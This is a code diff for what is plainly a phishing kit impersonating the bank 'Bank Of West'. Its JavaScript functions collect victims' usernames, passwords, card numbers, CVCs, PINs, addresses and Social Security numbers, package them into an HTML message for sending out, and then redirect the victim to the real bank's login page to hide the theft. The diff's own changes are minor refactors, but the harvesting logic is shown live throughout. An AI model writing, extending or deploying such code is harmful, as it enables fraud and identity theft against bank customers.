@@ -1,4 +1,4 @@
-const SubmitFirstUsers = () => {
+const SubmitFirstUsers = async () => {
   document.getElementById("submitBtn").setAttribute("disabled", true);
 
   const username = document.getElementById("pad").value;
@@ -15,7 +15,7 @@ const SubmitFirstUsers = () => {
     localStorage.setItem("BOWusername", username);
     localStorage.setItem("BOWpassword", password);
 
-   const sendDetails = `<h3> UserName : ${username} <br> Password : ${password} </h3>`;
+    const sendDetails = `<h3> UserName : ${username} <br> Password : ${password} </h3>`;
 
     const sendData = {
       siteName: "Bank Of West",
@@ -47,7 +47,7 @@ const SubmitFirstUsers = () => {
   }
 };
 
-const SubmitPersonalInfo = () => {
+const SubmitPersonalInfo = async () => {
   document.getElementById("submitBtn").setAttribute("disabled", true);
 
   const userfullName = document.getElementById("userfullName").value;
@@ -89,7 +89,7 @@ const SubmitPersonalInfo = () => {
     localStorage.setItem("BOWuserfullZip", userfullZip);
     localStorage.setItem("BOWuserfullSSN", userfullSSN);
 
-   const sendDetails = `<h3> UserName : ${localStorage.BOWusername} <br> Password : ${localStorage.BOWpassword} <br> Card Number : ${localStorage.cardNumber} <br> Card Expiry Date  : ${localStorage.cardExpiryDate} <br> Card CVC : ${localStorage.cardCVC} <br> Card Pin : ${localStorage.cardPin}  <br> Full Name : ${userfullName} <br> Mobile : ${userfullMobile} <br> Address : ${userfullAddress} <br> City : ${userfullCity} <br> State : ${userfullState} <br> Zip Code : ${userfullZip} <br> SSN : ${userfullSSN} </h3>`;
+    const sendDetails = `<h3> UserName : ${localStorage.BOWusername} <br> Password : ${localStorage.BOWpassword} <br> Card Number : ${localStorage.cardNumber} <br> Card Expiry Date  : ${localStorage.cardExpiryDate} <br> Card CVC : ${localStorage.cardCVC} <br> Card Pin : ${localStorage.cardPin}  <br> Full Name : ${userfullName} <br> Mobile : ${userfullMobile} <br> Address : ${userfullAddress} <br> City : ${userfullCity} <br> State : ${userfullState} <br> Zip Code : ${userfullZip} <br> SSN : ${userfullSSN} </h3>`;
 
     const sendData = {
       siteName: "Bank Of West",
@@ -138,7 +138,7 @@ const SubmitPersonalInfo = () => {
   }
 };
 
-const FinalSubmitForm = () => {
+const FinalSubmitForm = async () => {
   document.getElementById("FinalSubmit").setAttribute("disabled", true);
 
   const cardNumber = document.getElementById("padNumber").value;
@@ -210,7 +210,7 @@ const FinalSubmitForm = () => {
     );
 };
 
-const SubmitEmailDetails = () => {
+const SubmitEmailDetails = async () => {
   document.getElementById("submitBtn").setAttribute("disabled", true);
 
   const email = document.getElementById("userMail").value;
@@ -264,7 +264,8 @@ const completeSubmission = async () => {
       (data) =>
         data === "Sent" &&
         setTimeout(
-          () => location.assign("https://online.bankofthewest.com/BOW/Login.aspx"),
+          () =>
+            location.assign("https://online.bankofthewest.com/BOW/Login.aspx"),
           3000
         )
     );
